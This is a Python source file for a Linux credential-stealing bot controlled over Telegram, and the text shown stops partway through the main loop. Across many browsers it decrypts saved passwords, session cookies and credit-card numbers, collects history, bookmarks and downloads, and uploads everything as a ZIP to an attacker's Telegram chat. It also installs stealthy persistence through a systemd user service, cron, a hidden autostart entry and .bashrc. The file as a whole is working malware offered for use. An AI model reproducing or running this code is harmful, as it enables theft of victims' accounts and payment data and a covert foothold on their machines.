#!/usr/bin/env python3
"""
HackBrowserData Telegram Bot — Linux Edition
Platform: Linux (Ubuntu, Debian, Fedora, Arch, etc.)
Browsers: Chrome, Chromium, Firefox, Brave, Edge, Opera, Vivaldi, Yandex + more

SETUP:
  1. Set BOT_TOKEN and CHAT_ID in the CONFIGURATION section below.
  2. Run: python3 bot_linux.py
  3. The bot auto-installs dependencies, reports to Telegram, and optionally
     installs persistence (systemd / cron / XDG autostart).

COMMANDS:
  /extract  — Collect all browser data and send as ZIP
  /info     — System information
  /browsers — List detected browsers
  /status   — Bot status
  /help     — This message
"""

# ========================= CONFIGURATION =========================
# ↓↓↓ FILL THESE IN BEFORE DEPLOYING ↓↓↓
BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE"   # e.g. "123456789:ABCdefGHI..."
CHAT_ID    = "YOUR_CHAT_ID_HERE"     # e.g. "987654321"
# -----------------------------------------------------------------
# Periodic auto-extraction interval in seconds; 0 = disabled
CHECK_INTERVAL = 0      # e.g. 3600 for hourly
# Install persistence on first run (systemd > cron > XDG autostart)
AUTO_PERSIST   = True
# =================================================================

import os
import sys
import json
import base64
import shutil
import sqlite3
import tempfile
import zipfile
import platform
import subprocess
import time
import threading
import atexit
from pathlib import Path
from datetime import datetime

# ── dependency bootstrap (must come before any third-party import) ──
def _pip(*pkgs):
    try:
        subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '-q', '--user'] + list(pkgs),
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120
        )
    except Exception:
        pass

try:
    import requests
except ImportError:
    _pip('requests')
    import requests

try:
    from Crypto.Cipher  import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash    import SHA1, SHA256
except ImportError:
    _pip('pycryptodome')
    from Crypto.Cipher  import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash    import SHA1, SHA256

# ========================= TELEGRAM API ==========================

_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
_FILE_LIMIT = 49 * 1024 * 1024     # 49 MB — Telegram bot limit


def _tg(method, **kwargs):
    """POST to Telegram with exponential-backoff retry (up to 5 attempts)."""
    url = f'{_API}/{method}'
    for attempt in range(5):
        try:
            r = requests.post(url, timeout=60, **kwargs)
            return r.json()
        except Exception:
            time.sleep(min(2 ** attempt, 30))
    return None


def send_message(text, chat_id=None):
    """Send HTML text, chunking at 4 096 characters."""
    cid = chat_id or CHAT_ID
    for i in range(0, max(1, len(text)), 4096):
        _tg('sendMessage', data={
            'chat_id': cid, 'text': text[i:i + 4096], 'parse_mode': 'HTML'
        })


def send_file(path, chat_id=None, caption=None):
    """Upload a file; warn if it exceeds the 49 MB Telegram limit."""
    cid = chat_id or CHAT_ID
    try:
        size = os.path.getsize(path)
        if size > _FILE_LIMIT:
            send_message(
                f"⚠️ File too large ({size // 1_048_576} MB). Skipping upload.", cid
            )
            return None
        with open(path, 'rb') as fh:
            return _tg('sendDocument',
                       data={'chat_id': cid, 'caption': caption or ''},
                       files={'document': (os.path.basename(path), fh)})
    except Exception as e:
        send_message(f"⚠️ Upload error: {e}", cid)
        return None


def get_updates(offset=None):
    url = f'{_API}/getUpdates'
    for attempt in range(3):
        try:
            r = requests.get(url, params={'timeout': 30, 'offset': offset}, timeout=35)
            return r.json()
        except Exception:
            time.sleep(2 ** attempt)
    return None

# ========================= SYSTEM INFO ==========================


def system_info():
    return {
        'platform':  platform.system(),
        'release':   platform.release(),
        'arch':      platform.machine(),
        'hostname':  platform.node() or 'unknown',
        'username':  (os.environ.get('USER') or os.environ.get('LOGNAME')
                      or os.environ.get('USERNAME') or 'unknown'),
        'home':      str(Path.home()),
        'python':    sys.version.split()[0],
    }

# ========================= BROWSER PATHS ========================


def find_browser_paths():
    """
    Return {browser_name: [profile_path, ...]} for Chromium-based browsers
    and {browser_name: base_dir} for Firefox-based browsers.
    """
    home = Path.home()
    cfg  = home / '.config'

    chromium_bases = {
        'chrome':            cfg  / 'google-chrome',
        'chrome-beta':       cfg  / 'google-chrome-beta',
        'chrome-dev':        cfg  / 'google-chrome-unstable',
        'chromium':          cfg  / 'chromium',
        'chromium-snap':     home / 'snap/chromium/common/chromium',
        'edge':              cfg  / 'microsoft-edge',
        'edge-beta':         cfg  / 'microsoft-edge-beta',
        'brave':             cfg  / 'BraveSoftware/Brave-Browser',
        'opera':             cfg  / 'opera',
        'opera-beta':        cfg  / 'opera-beta',
        'vivaldi':           cfg  / 'vivaldi',
        'vivaldi-snapshot':  cfg  / 'vivaldi-snapshot',
        'yandex':            cfg  / 'yandex-browser',
    }
    firefox_bases = {
        'firefox':           home / '.mozilla/firefox',
        'firefox-snap':      home / 'snap/firefox/common/.mozilla/firefox',
        'firefox-flatpak':   home / '.var/app/org.mozilla.firefox/.mozilla/firefox',
        'librewolf':         home / '.librewolf',
        'waterfox':          home / '.waterfox',
    }

    result = {}

    for name, base in chromium_bases.items():
        if not base.exists():
            continue
        profiles = []
        try:
            for item in base.iterdir():
                if item.is_dir() and (
                    item.name == 'Default' or item.name.startswith('Profile ')
                ):
                    profiles.append(item)
        except PermissionError:
            continue
        if profiles:
            result[name] = profiles

    for name, base in firefox_bases.items():
        if base.exists():
            result[name] = base   # Firefox: base dir; profiles found via profiles.ini

    return result


def find_firefox_profiles(base_path):
    """Parse profiles.ini and return list of existing profile Paths."""
    ini  = base_path / 'profiles.ini'
    profiles = []
    if ini.exists():
        try:
            import configparser
            cfg = configparser.ConfigParser()
            cfg.read(ini)
            for section in cfg.sections():
                if not section.lower().startswith('profile'):
                    continue
                path_val = cfg.get(section, 'Path', fallback=None)
                if path_val is None:
                    continue
                is_rel = cfg.getint(section, 'IsRelative', fallback=1)
                p = (base_path / path_val) if is_rel else Path(path_val)
                if p.exists():
                    profiles.append(p)
        except Exception:
            pass
    if not profiles:                              # fallback: scan for *.default* dirs
        try:
            for item in base_path.iterdir():
                if item.is_dir() and '.default' in item.name:
                    profiles.append(item)
        except Exception:
            pass
    return profiles

# =================== CHROMIUM DECRYPTION (LINUX) =================


def chromium_master_key(_profile_path=None):
    """
    Linux Chromium master key is always PBKDF2('peanuts', 'saltysalt', 1, 16).
    There is no DPAPI / Local State encrypted_key on Linux.
    """
    return PBKDF2(b'peanuts', b'saltysalt', dkLen=16, count=1,
                  hmac_hash_module=SHA1)


def chromium_decrypt(blob, key):
    """Decrypt a v10/v11 AES-128-CBC Chromium-encrypted field (Linux)."""
    try:
        if not blob or not key:
            return ''
        if blob[:3] in (b'v10', b'v11'):
            blob = blob[3:]
        cipher    = AES.new(key, AES.MODE_CBC, b' ' * 16)
        plaintext = cipher.decrypt(blob)
        return unpad(plaintext, 16).decode('utf-8', errors='replace')
    except Exception:
        return '[decryption failed]'


def _chrome_ts(ts):
    """Convert Chrome microsecond-since-1601 timestamp to datetime or None."""
    if not ts or ts <= 0:
        return None
    try:
        return datetime.fromtimestamp((ts - 11_644_473_600_000_000) / 1_000_000)
    except (OSError, ValueError, OverflowError):
        return None

# ===================== TEMP-DB HELPER ===========================


def _with_db(src, callback):
    """Copy an SQLite file to a temp path, run callback(cursor), return result."""
    tmp = Path(tempfile.gettempdir()) / f'hbd_{os.getpid()}_{src.name}'
    try:
        shutil.copy2(src, tmp)
        conn = sqlite3.connect(str(tmp))
        try:
            return callback(conn.cursor())
        finally:
            conn.close()
    except Exception:
        return []
    finally:
        try:
            tmp.unlink()
        except Exception:
            pass

# =================== CHROMIUM EXTRACTORS ========================


def get_chromium_passwords(profile, key):
    db = profile / 'Login Data'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT origin_url,username_value,password_value,'
                'date_created,date_last_used FROM logins ORDER BY date_last_used DESC'
            )
            for url, user, enc, dc, dlu in cur.fetchall():
                if user and enc:
                    rows.append({
                        'url':       url,
                        'username':  user,
                        'password':  chromium_decrypt(enc, key),
                        'created':   str(_chrome_ts(dc) or ''),
                        'last_used': str(_chrome_ts(dlu) or ''),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_cookies(profile, key):
    db = None
    for p in [profile / 'Cookies', profile / 'Network' / 'Cookies']:
        if p.exists():
            db = p
            break
    if db is None:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host_key,name,encrypted_value,path,expires_utc,'
                'is_secure,is_httponly FROM cookies ORDER BY host_key'
            )
            for host, name, enc, path, exp, sec, httpo in cur.fetchall():
                if enc:
                    rows.append({
                        'host':     host,
                        'name':     name,
                        'value':    chromium_decrypt(enc, key),
                        'path':     path,
                        'expires':  str(_chrome_ts(exp) or ''),
                        'secure':   bool(sec),
                        'httponly': bool(httpo),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_history(profile):
    db = profile / 'History'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_time '
                'FROM urls ORDER BY last_visit_time DESC LIMIT 1000'
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url': url, 'title': title or '',
                    'visits': vc, 'last_visit': str(_chrome_ts(lv) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_bookmarks(profile):
    bm = profile / 'Bookmarks'
    if not bm.exists():
        return []
    bookmarks = []
    def _walk(node, folder=''):
        if node.get('type') == 'url':
            bookmarks.append({
                'name': node.get('name', ''), 'url': node.get('url', ''),
                'folder': folder,
            })
        elif node.get('type') == 'folder':
            sub = f"{folder}/{node.get('name','')}" if folder else node.get('name', '')
            for child in node.get('children', []):
                _walk(child, sub)
    try:
        data = json.loads(bm.read_text(encoding='utf-8'))
        for root in data.get('roots', {}).values():
            if isinstance(root, dict):
                for child in root.get('children', []):
                    _walk(child)
    except Exception:
        pass
    return bookmarks


def get_chromium_credit_cards(profile, key):
    db = profile / 'Web Data'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT name_on_card,expiration_month,expiration_year,'
                'card_number_encrypted FROM credit_cards'
            )
            for name, em, ey, enc in cur.fetchall():
                if enc:
                    rows.append({
                        'name':   name,
                        'number': chromium_decrypt(enc, key),
                        'expiry': f'{em}/{ey}',
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_downloads(profile):
    db = profile / 'History'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT target_path,tab_url,total_bytes,start_time '
                'FROM downloads ORDER BY start_time DESC LIMIT 500'
            )
            for target, url, size, st in cur.fetchall():
                rows.append({
                    'path': target, 'url': url,
                    'size': size, 'date': str(_chrome_ts(st) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ====================== FIREFOX DER UTILITIES ====================


def _der_next(data, pos):
    """Read one DER TLV element. Returns (tag, value_bytes, next_pos)."""
    tag  = data[pos]; pos += 1
    b    = data[pos]; pos += 1
    if b < 0x80:
        length = b
    else:
        n      = b & 0x7f
        length = int.from_bytes(data[pos:pos + n], 'big')
        pos   += n
    return tag, data[pos:pos + length], pos + length


def _oid_str(raw):
    """Decode DER OID bytes to dotted string."""
    parts = [raw[0] // 40, raw[0] % 40]
    acc   = 0
    for b in raw[1:]:
        acc = (acc << 7) | (b & 0x7f)
        if not (b & 0x80):
            parts.append(acc)
            acc = 0
    return '.'.join(map(str, parts))


_OID_3DES       = '1.2.840.113549.3.7'
_OID_AES256_CBC = '2.16.840.1.101.3.4.1.42'
_OID_HMAC_SHA1  = '1.2.840.113549.2.7'


def _ff_pbes2_decrypt(blob, password=b''):
    """
    Decrypt a Firefox PBES2-encoded DER blob (item2 from metadata, or a11 from
    nssPrivate).  Handles both PBKDF2-SHA1+3DES-CBC and PBKDF2-SHA256+AES-256-CBC.
    Returns plaintext bytes or None on failure.
    """
    try:
        # Outer SEQUENCE → { AlgorithmIdentifier, OCTET STRING(ct) }
        _, outer, _    = _der_next(blob, 0)
        pos = 0
        _, alg_id, pos = _der_next(outer, pos)   # AlgorithmIdentifier SEQUENCE
        _, ciphertext, _ = _der_next(outer, pos) # ciphertext OCTET STRING

        # AlgorithmIdentifier → { OID(PBES2), params SEQUENCE }
        pos = 0
        _, _oid_raw, pos = _der_next(alg_id, pos)
        _, params, _     = _der_next(alg_id, pos)

        # params → { keyDerivationFunc SEQUENCE, encryptionScheme SEQUENCE }
        pos = 0
        _, kdf_seq, pos = _der_next(params, pos)
        _, enc_seq, _   = _der_next(params, pos)

        # keyDerivationFunc → { OID(PBKDF2), PBKDF2-params SEQUENCE }
        pos = 0
        _, _kdf_oid, pos  = _der_next(kdf_seq, pos)
        _, kdf_params, _  = _der_next(kdf_seq, pos)

        # PBKDF2-params → salt OCTET STRING, iterations INTEGER,
        #                  [keyLength INTEGER], [prf SEQUENCE]
        pos = 0
        _, salt,     pos = _der_next(kdf_params, pos)
        _, iter_raw, pos = _der_next(kdf_params, pos)
        iterations = int.from_bytes(iter_raw, 'big')

        key_len  = 32
        hmac_mod = SHA256
        if pos < len(kdf_params):
            tag2, val2, pos2 = _der_next(kdf_params, pos)
            if tag2 == 0x02:                                # INTEGER = keyLength
                key_len = int.from_bytes(val2, 'big')
                if pos2 < len(kdf_params):
                    _, prf_seq, _ = _der_next(kdf_params, pos2)
                    _, prf_oid_r, _ = _der_next(prf_seq, 0)
                    if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                        hmac_mod = SHA1
            elif tag2 == 0x30:                              # SEQUENCE = prf (no keyLength)
                _, prf_oid_r, _ = _der_next(val2, 0)
                if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                    hmac_mod = SHA1
                    key_len  = 24

        # encryptionScheme → { OID(cipher), IV OCTET STRING }
        pos = 0
        _, enc_oid_r, pos = _der_next(enc_seq, pos)
        _, iv, _          = _der_next(enc_seq, pos)
        cipher_oid = _oid_str(enc_oid_r)

        # Derive key
        key = PBKDF2(password, salt, dkLen=key_len, count=iterations,
                     hmac_hash_module=hmac_mod)

        # Decrypt
        if cipher_oid == _OID_3DES:
            return DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:                                               # AES-256-CBC (default)
            return AES.new(key[:key_len], AES.MODE_CBC, iv).decrypt(ciphertext)
    except Exception:
        return None


def _ff_extract_cka_value(decrypted_a11):
    """
    Extract the raw CKA_VALUE (symmetric key) from a decrypted NSS a11 blob.
    Based on empirical offsets from firepwd.py: key starts at byte 70.
    """
    if len(decrypted_a11) >= 102:           # 70 + 32 → AES-256
        return decrypted_a11[70:102], _OID_AES256_CBC
    if len(decrypted_a11) >= 94:            # 70 + 24 → 3DES
        return decrypted_a11[70:94], _OID_3DES
    if len(decrypted_a11) >= 32:            # fallback: last 32 bytes
        return decrypted_a11[-32:], _OID_AES256_CBC
    return None, None


def get_firefox_master_key(profile_path):
    """
    Extract the Firefox login-decryption key from key4.db (no master password).
    Returns (key_bytes, cipher_oid) or (None, None).
    """
    key4 = profile_path / 'key4.db'
    if not key4.exists():
        return None, None

    def _q(cur):
        try:
            # Verify there is no master password
            cur.execute("SELECT item2 FROM metadata WHERE id='password'")
            row = cur.fetchone()
            if not row:
                return None, None
            check = _ff_pbes2_decrypt(bytes(row[0]))
            if check is None or b'password-check' not in check[:20]:
                return None, None          # master password set — skip

            # Check the nssPrivate table exists
            cur.execute(
                "SELECT name FROM sqlite_master "
                "WHERE type='table' AND name='nssPrivate'"
            )
            if not cur.fetchone():
                return None, None

            cur.execute('SELECT a11 FROM nssPrivate')
            for (a11_blob,) in cur.fetchall():
                if not a11_blob:
                    continue
                dec = _ff_pbes2_decrypt(bytes(a11_blob))
                if dec is None:
                    continue
                key, oid = _ff_extract_cka_value(dec)
                if key:
                    return key, oid
        except Exception:
            pass
        return None, None

    tmp = Path(tempfile.gettempdir()) / f'key4_{os.getpid()}.db'
    try:
        shutil.copy2(key4, tmp)
        conn = sqlite3.connect(str(tmp))
        try:
            result = _q(conn.cursor())
        finally:
            conn.close()
        return result if result else (None, None)
    except Exception:
        return None, None
    finally:
        try:
            tmp.unlink()
        except Exception:
            pass


def _ff_decrypt_field(b64_val, key, cipher_oid):
    """Decrypt one Firefox login field (base64-encoded SEQUENCE blob)."""
    try:
        blob = base64.b64decode(b64_val)
        # SEQUENCE { SEQUENCE { OID(cipher), IV }, OCTET STRING(ct) }
        _, outer, _ = _der_next(blob, 0)
        pos = 0
        _, enc_info, pos = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, oid_r, pos = _der_next(enc_info, pos)
        _, iv, _      = _der_next(enc_info, pos)
        field_oid     = _oid_str(oid_r)

        if field_oid == _OID_3DES or cipher_oid == _OID_3DES:
            plain = DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            plain = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ciphertext)

        # Remove PKCS#7 padding
        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            plain = plain[:-pad_len]
        return plain.decode('utf-8', errors='replace').strip('\x00')
    except Exception:
        return '[encrypted]'

# ====================== FIREFOX EXTRACTORS =======================


def get_firefox_passwords(profile):
    logins_json = profile / 'logins.json'
    if not logins_json.exists():
        return []
    key, oid = get_firefox_master_key(profile)
    passwords = []
    try:
        data = json.loads(logins_json.read_text(encoding='utf-8'))
        for login in data.get('logins', []):
            url = login.get('formSubmitURL') or login.get('hostname', '')
            eu  = login.get('encryptedUsername', '')
            ep  = login.get('encryptedPassword', '')
            if key:
                username = _ff_decrypt_field(eu, key, oid)
                password = _ff_decrypt_field(ep, key, oid)
            else:
                username = '[master password required]'
                password = '[master password required]'
            tc = login.get('timeCreated')
            passwords.append({
                'url':      url,
                'username': username,
                'password': password,
                'created':  str(datetime.fromtimestamp(tc / 1000)) if tc else '',
            })
    except Exception:
        pass
    return passwords


def get_firefox_cookies(profile):
    db = profile / 'cookies.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host,name,value,path,expiry,isSecure,isHttpOnly '
                'FROM moz_cookies ORDER BY host'
            )
            for host, name, val, path, exp, sec, httpo in cur.fetchall():
                rows.append({
                    'host': host, 'name': name, 'value': val or '',
                    'path': path,
                    'expires':  str(datetime.fromtimestamp(exp)) if exp else '',
                    'secure':   bool(sec),
                    'httponly': bool(httpo),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_history(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_date '
                'FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000'
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url':        url,
                    'title':      title or '',
                    'visits':     vc,
                    'last_visit': str(datetime.fromtimestamp(lv / 1_000_000)) if lv else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_bookmarks(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT b.title, p.url, b.dateAdded '
                'FROM moz_bookmarks b '
                'INNER JOIN moz_places p ON b.fk = p.id '
                'WHERE b.type = 1 ORDER BY b.dateAdded DESC'
            )
            for title, url, da in cur.fetchall():
                rows.append({
                    'name':  title or '',
                    'url':   url,
                    'added': str(datetime.fromtimestamp(da / 1_000_000)) if da else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ========================= DATA COLLECTION =======================


def collect_all():
    result = {
        'system':    system_info(),
        'browsers':  {},
        'timestamp': datetime.now().isoformat(),
    }
    paths = find_browser_paths()
    for browser, path_or_list in paths.items():
        result['browsers'][browser] = {}
        try:
            if 'firefox' in browser or 'librewolf' in browser or 'waterfox' in browser:
                base     = path_or_list
                profiles = find_firefox_profiles(base)
                for prof in profiles:
                    result['browsers'][browser][prof.name] = {
                        'passwords': get_firefox_passwords(prof),
                        'cookies':   get_firefox_cookies(prof),
                        'history':   get_firefox_history(prof),
                        'bookmarks': get_firefox_bookmarks(prof),
                    }
            else:
                profiles = path_or_list
                # Master key for Linux: same for all profiles of one browser
                key = chromium_master_key()
                for prof in profiles:
                    result['browsers'][browser][prof.name] = {
                        'passwords':    get_chromium_passwords(prof, key),
                        'cookies':      get_chromium_cookies(prof, key),
                        'history':      get_chromium_history(prof),
                        'bookmarks':    get_chromium_bookmarks(prof),
                        'credit_cards': get_chromium_credit_cards(prof, key),
                        'downloads':    get_chromium_downloads(prof),
                    }
        except Exception as e:
            result['browsers'][browser]['error'] = str(e)
    return result


def _count(data, key):
    n = 0
    for pdict in data['browsers'].values():
        for pdata in pdict.values():
            if isinstance(pdata, dict):
                n += len(pdata.get(key, []))
    return n


def make_zip(data):
    """Format all collected data and pack into a ZIP file. Returns the path."""
    tmp_dir = Path(tempfile.mkdtemp())
    try:
        files = {}
        si    = data['system']
        files['system_info.txt'] = '\n'.join(
            f"{k}: {v}" for k, v in si.items()
        )
        files['full_data.json'] = json.dumps(data, indent=2, default=str)

        for browser, prof_dict in data['browsers'].items():
            for prof_name, pdata in prof_dict.items():
                if not isinstance(pdata, dict):
                    continue
                pfx = f"{browser}_{prof_name}"

                if pdata.get('passwords'):
                    txt = f"=== {browser.upper()} — {prof_name} PASSWORDS ===\n\n"
                    for p in pdata['passwords']:
                        txt += (f"URL:      {p['url']}\n"
                                f"Username: {p['username']}\n"
                                f"Password: {p['password']}\n"
                                f"Last used:{p.get('last_used','')}\n\n")
                    files[f"{pfx}_passwords.txt"] = txt

                if pdata.get('cookies'):
                    txt = (f"=== {browser.upper()} — {prof_name} COOKIES "
                           f"({len(pdata['cookies'])}) ===\n\n")
                    for c in pdata['cookies'][:500]:
                        txt += (f"Host:  {c['host']}\n"
                                f"Name:  {c['name']}\n"
                                f"Value: {str(c.get('value',''))[:200]}\n\n")
                    files[f"{pfx}_cookies.txt"] = txt

                if pdata.get('history'):
                    txt = (f"=== {browser.upper()} — {prof_name} HISTORY "
                           f"({len(pdata['history'])}) ===\n\n")
                    for h in pdata['history'][:500]:
                        txt += (f"URL:   {h['url']}\n"
                                f"Title: {h.get('title','')}\n"
                                f"Visits:{h.get('visits','')}\n"
                                f"Last:  {h.get('last_visit','')}\n\n")
                    files[f"{pfx}_history.txt"] = txt

                if pdata.get('bookmarks'):
                    txt = f"=== {browser.upper()} — {prof_name} BOOKMARKS ===\n\n"
                    for b in pdata['bookmarks']:
                        txt += (f"Name:   {b.get('name','')}\n"
                                f"URL:    {b.get('url','')}\n"
                                f"Folder: {b.get('folder','')}\n\n")
                    files[f"{pfx}_bookmarks.txt"] = txt

                if pdata.get('credit_cards'):
                    txt = f"=== {browser.upper()} — {prof_name} CREDIT CARDS ===\n\n"
                    for cc in pdata['credit_cards']:
                        txt += (f"Name:   {cc['name']}\n"
                                f"Number: {cc['number']}\n"
                                f"Expiry: {cc['expiry']}\n\n")
                    files[f"{pfx}_credit_cards.txt"] = txt

                if pdata.get('downloads'):
                    txt = (f"=== {browser.upper()} — {prof_name} DOWNLOADS "
                           f"({len(pdata['downloads'])}) ===\n\n")
                    for d in pdata['downloads'][:200]:
                        txt += (f"URL:  {d.get('url','')}\n"
                                f"Path: {d.get('path','')}\n"
                                f"Date: {d.get('date','')}\n\n")
                    files[f"{pfx}_downloads.txt"] = txt

        for fname, content in files.items():
            (tmp_dir / fname).write_text(content, encoding='utf-8')

        hostname = si.get('hostname', 'linux') or 'linux'
        zip_name = f"linux_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_path = Path(tempfile.gettempdir()) / zip_name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in tmp_dir.iterdir():
                zf.write(f, f.name)
        return zip_path
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# ====================== BOT COMMAND HANDLERS =====================


def handle_command(text, chat_id):
    # Strip @BotName suffix and isolate the command word
    cmd = text.split()[0].split('@')[0].lower().strip()

    if cmd in ('/start', '/help'):
        send_message(
            '<b>🔐 HackBrowserData — Linux Bot</b>\n\n'
            '<b>Commands:</b>\n'
            '/extract  — Collect all browser data (ZIP)\n'
            '/info     — System information\n'
            '/browsers — List detected browsers\n'
            '/status   — Bot status\n'
            '/help     — This message',
            chat_id
        )

    elif cmd == '/extract':
        send_message('⏳ Collecting browser data…', chat_id)
        zip_path = None
        try:
            data     = collect_all()
            zip_path = make_zip(data)
            stats = (
                f'<b>✅ Extraction complete</b>\n\n'
                f'<b>Host:</b>         {data["system"].get("hostname")}\n'
                f'<b>User:</b>         {data["system"].get("username")}\n'
                f'<b>Passwords:</b>    {_count(data,"passwords")}\n'
                f'<b>Cookies:</b>      {_count(data,"cookies")}\n'
                f'<b>History URLs:</b> {_count(data,"history")}\n'
                f'<b>Credit cards:</b> {_count(data,"credit_cards")}'
            )
            send_message(stats, chat_id)
            send_file(str(zip_path), chat_id, 'Browser data')
        except Exception as e:
            send_message(f'❌ Error during extraction: {e}', chat_id)
        finally:
            if zip_path:
                try:
                    zip_path.unlink()
                except Exception:
                    pass

    elif cmd == '/info':
        info = system_info()
        send_message(
            '<b>System Information:</b>\n' +
            '\n'.join(f'<b>{k}:</b> {v}' for k, v in info.items()),
            chat_id
        )

    elif cmd == '/browsers':
        send_message('🔍 Scanning for browsers…', chat_id)
        paths = find_browser_paths()
        if not paths:
            send_message('No browsers detected.', chat_id)
            return
        txt = f'<b>Browsers detected: {len(paths)}</b>\n\n'
        for b, p in paths.items():
            if isinstance(p, list):
                txt += f'✓ <b>{b}</b> ({len(p)} profile(s))\n'
            else:
                txt += f'✓ <b>{b}</b> (Firefox-based)\n'
        send_message(txt, chat_id)

    elif cmd == '/status':
        send_message(
            f'<b>Status:</b> ✅ Running\n'
            f'<b>Platform:</b> Linux\n'
            f'<b>Python:</b> {sys.version.split()[0]}\n'
            f'<b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            chat_id
        )

    else:
        send_message(f'Unknown command: <code>{cmd}</code>  — use /help', chat_id)

# ========================= PERSISTENCE ==========================


def install_persistence():
    script = str(Path(__file__).resolve())
    home   = Path.home()
    interp = sys.executable

    # 1. systemd user service (most reliable on modern Linux)
    try:
        svc_dir = home / '.config' / 'systemd' / 'user'
        svc_dir.mkdir(parents=True, exist_ok=True)
        svc = svc_dir / 'hbd-agent.service'
        svc.write_text(
            '[Unit]\nDescription=HBD Agent\nAfter=network.target\n\n'
            '[Service]\nType=simple\n'
            f'ExecStart={interp} {script}\n'
            'Restart=always\nRestartSec=60\n\n'
            '[Install]\nWantedBy=default.target\n'
        )
        subprocess.run(['systemctl', '--user', 'daemon-reload'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['systemctl', '--user', 'enable', '--now', 'hbd-agent.service'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return
    except Exception:
        pass

    # 2. cron @reboot fallback
    try:
        res    = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        cron   = res.stdout if res.returncode == 0 else ''
        entry  = f'@reboot {interp} {script} >/dev/null 2>&1 &\n'
        if script not in cron:
            proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            proc.communicate((cron + entry).encode())
    except Exception:
        pass

    # 3. XDG autostart desktop entry
    try:
        ad = home / '.config' / 'autostart'
        ad.mkdir(parents=True, exist_ok=True)
        (ad / 'hbd-agent.desktop').write_text(
            '[Desktop Entry]\nType=Application\nName=System Agent\n'
            f'Exec={interp} {script}\nHidden=false\nNoDisplay=true\n'
            'X-GNOME-Autostart-enabled=true\n'
        )
    except Exception:
        pass

    # 4. ~/.bashrc append (last-resort)
    try:
        bashrc = home / '.bashrc'
        marker = f'# hbd-agent'
        content = bashrc.read_text(encoding='utf-8') if bashrc.exists() else ''
        if marker not in content:
            with bashrc.open('a') as fh:
                fh.write(
                    f'\n{marker}\n'
                    f'(pgrep -f "{script}" || {interp} {script}) &\n'
                )
    except Exception:
        pass

# ========================= LOCK FILE ============================

_LOCK = Path(tempfile.gettempdir()) / f'hbd_linux_{os.getuid()}.lock'


def _acquire_lock():
    """Return False if another instance is already running."""
    if _LOCK.exists():
        try:
            pid = int(_LOCK.read_text().strip())
            os.kill(pid, 0)
            return False                     # process is alive
        except (ProcessLookupError, PermissionError):
            pass                             # stale lock
        except Exception:
            pass
    _LOCK.write_text(str(os.getpid()))
    atexit.register(lambda: _LOCK.unlink() if _LOCK.exists() else None)
    return True

# ========================= BOT LOOP =============================


def _auto_extract():
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            data = collect_all()
            zp   = make_zip(data)
            send_message(
                f'⏰ Scheduled extraction — '
                f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            )
            send_file(str(zp), caption='Scheduled extraction')
            try:
                zp.unlink()
            except Exception:
                pass
        except Exception:
            pass


def _drain_updates():
    """Discard any updates that arrived before the bot started."""
    upd = get_updates(-1)
    if upd and upd.get('result'):
        return upd['result'][-1]['update_id'] + 1
    return None


def run_bot():
    si  = system_info()
    msg = (
        f'<b>🐧 Linux Bot Online</b>\n\n'
        f'<b>Host:</b>     {si["hostname"]}\n'
        f'<b>User:</b>     {si["username"]}\n'
        f'<b>Home:</b>     {si["home"]}\n'
        f'<b>Time:</b>     {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'
        f'Use /help for available commands.'
    )
    send_message(msg)

    offset = _drain_updates()
    errors = 0

    while True:
        updates = get_updates(offset)
        if updates is None:
            errors += 1
            time.sleep(min(2 ** errors, 120))
            continue
